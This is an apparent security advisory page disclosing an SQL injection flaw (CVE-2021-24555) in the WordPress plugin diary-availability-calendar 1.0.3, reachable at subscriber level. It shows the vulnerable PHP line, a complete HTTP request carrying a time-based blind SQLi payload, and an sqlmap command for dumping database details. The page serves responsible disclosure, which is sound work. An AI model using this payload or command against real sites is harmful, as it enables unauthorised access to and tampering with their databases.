<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
      <title>wp-plugin : diary-availability-calendar | Code Vigilant : to err is human.. To fix is Humanity</title>
    
    <link rel="stylesheet" href="/css/style.css" />
    <link rel="stylesheet" href="/css/fonts.css" />
    
  </head>

  <body>
<a href="https://codevigilant.com"><img src="/banner.png" class="header-image" width="508" height="111" alt=""  /></a>

<nav class="menu">
	<ul class="menu__list">
		<li class="menu__item">
			<a class="menu__link" href="/" >
				
				<span class="menu__text">Home</span>
				
			</a>
		</li>
		<li class="menu__item menu__dropdown">
			<a class="menu__link" href="/disclosure/">
				
				<span class="menu__text">Disclosure</span>

				
			</a>
			<input type="checkbox" id="Disclosure">
			<ul class="submenu__list">
				
					<li class="menu__item">
					<a class="menu__link" href="/category/injection/">
						
						<span class="menu__text">INJECTION</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/cross-site-scripting-xss/">
						
						<span class="menu__text">CROSS-SITE SCRIPTING (XSS)</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/information-disclosure/">
						
						<span class="menu__text">INFORMATION DISCLOSURE</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/local-file-inclusion/">
						
						<span class="menu__text">LOCAL FILE INCLUSION</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/ssrf/">
						
						<span class="menu__text">SSRF/XSPA</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/components-with-known-vulnerabilities/">
						
						<span class="menu__text">COMPONENTS WITH KNOWN VULNERABILITIES</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/unvalidated-redirects-and-forwards/">
						
						<span class="menu__text">UNVALIDATED REDIRECTS AND FORWARDS</span>
						
					</a>
					</li>
				
			</ul>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/blog/" >
				
				<span class="menu__text">Blog</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/feed.xml" >
				
				<span class="menu__text">RSS Feed</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/about-team/" >
				
				<span class="menu__text">About Team</span>
				
			</a>
		</li>
	</ul>
</nav>



<main>
	<br />
<center><a href=""><span class="title">Wp Plugin Diary Availability Calendar</span></a></center>

<h3><u>Plugin Details</u></h3><div>Plugin Name: <a href="https://wordpress.org/plugins/diary-availability-calendar/" rel="noreferrer noopener nofollow" target="_blank">wp-plugin : diary-availability-calendar</a></div>
<div>Effected Version : 1.0.3 (and most probably lower version's if any)</div>
<div>Vulnerability : <a href="/category/injection/">Injection</a></div>
<div>Minimum Level of Access Required : Subscriber</div>
<div>CVE Number : CVE-2021-24555</div>
<div>Identified by : <a href="/author/shreya_pohekar/">Shreya Pohekar</a></div>
<div><a href="https://wpscan.com/plugin/diary-availability-calendar/" rel="noreferrer noopener nofollow" target="_blank">WPScan Reference URL</a></div>
 
<h3><u>Disclosure Timeline</u></h3>
<ul>
	<li>

<div>May 14, 2021: Issue Identified and Disclosed to WPScan</div>

	</li>
	
	<li>
	May 19, 2021 : Plugin  Closed</li>
	
	
	<li>July 20, 2021 : CVE Assigned</li>
	
	<li>July 23, 2021 : Public Disclosure</li>
</ul>



<h3><u>Technical Details</u></h3>

<p>The delete calendar functionality takes in POST parameter <code>id</code> which is passed into the SQL statement without proper sanitisation, validation or escaping that leads to SQL Injection. Furthermore, the ajax call is not properly validated in terms of session check and therefore makes the plugin vulnerable at subsciber level too.</p>
<p>Vulnerable Code: <a href="https://plugins.trac.wordpress.org/browser/diary-availability-calendar/trunk/diary-availability-calendar.php#L561" target="_blank" rel="noreferrer noopener nofollow">diary-availability-calendar.php#L561</a>
</p>
<pre><code>559:                    $id = $_POST[&quot;id&quot;];
560:
561:                    $wpdb-&gt;query(&quot;DELETE FROM &quot;.$wpdb-&gt;prefix.$entries_table.&quot; WHERE id = $id&quot;);

</code></pre><h4 id="poc-screenshot">PoC Screenshot</h4>
<p><img src="/disclosure_screenshots/diary-availability-calendar-poc.png" alt="PoC Screenshot"></p>
<h4 id="exploit">Exploit</h4>
<pre><code>POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 172.28.128.50
Content-Length: 40
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://172.28.128.50
Referer: http://172.28.128.50/wp-admin/admin.php?page=daac-calendar
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_logged_in_232395f24f6cff47569f2739c21385d6=subscriber%7C1621354259%7CGgsBwDkoDZKcvZAcxb2GDBOdhN48qzMsMb6kY55KjhQ%7C61cd2bfaac2b99029b99d7040ea49bee669ea719d34dd3c1b7417f5dd75fce70; wordpress_test_cookie=WP%20Cookie%20check; wp-settings-time-4=1620144659; wordpress_232395f24f6cff47569f2739c21385d6=subscriber%7C1621354259%7CGgsBwDkoDZKcvZAcxb2GDBOdhN48qzMsMb6kY55KjhQ%7C268d8983e3cb02b9c953c1b85fbb585740d5bc04cbf3455ff410ff0b1e83e6d1; wordpress_232395f24f6cff47569f2739c21385d6=subscriber%7C1621354259%7CGgsBwDkoDZKcvZAcxb2GDBOdhN48qzMsMb6kY55KjhQ%7C268d8983e3cb02b9c953c1b85fbb585740d5bc04cbf3455ff410ff0b1e83e6d1;
Connection: close

action=daac_delete_booking&amp;id=1%20AND%20(SELECT%201209%20FROM%20(SELECT(SLEEP(5)))bOrN)

</code></pre><h4 id="sqlmap-command">SQLmap command</h4>
<pre><code>sqlmap -r diary-availability-calendar.req --dbms mysql --current-user --current-db -b -p id --batch 
</code></pre>

<br />


</main>

  <footer>
  
  
  <hr/>
  Â© <a href="https://anantshri.info">Anant Shrivastava</a> 2021
  
  </footer>
  </body>
</html>

